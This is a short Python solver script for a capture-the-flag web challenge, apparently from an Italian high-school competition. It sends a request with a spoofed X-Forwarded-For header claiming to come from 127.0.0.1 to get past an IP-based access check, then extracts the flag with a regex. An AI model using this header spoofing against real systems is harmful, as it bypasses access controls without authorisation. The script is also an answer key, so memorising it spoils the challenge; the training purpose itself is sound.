#!/bin/python3

import os
import requests
from pwn import *
import logging
import re

logging.disable()

# Per le challenge web
URL = os.environ.get("URL", "http://nearby.challs.cyberhighschools.it:37005")
if URL.endswith("/"):
    URL = URL[:-1]

regex = re.compile("flag{[^}]*}")
res = requests.get(URL, headers={"X-Forwarded-For": "127.0.0.1"})
if not res.ok:
    print(f"Cannot contact {URL}")
    exit(1)

flag = regex.findall(res.text)
if len(flag) == 0:
    print("Cannot find the flag")
    exit(2)
print(flag[0])
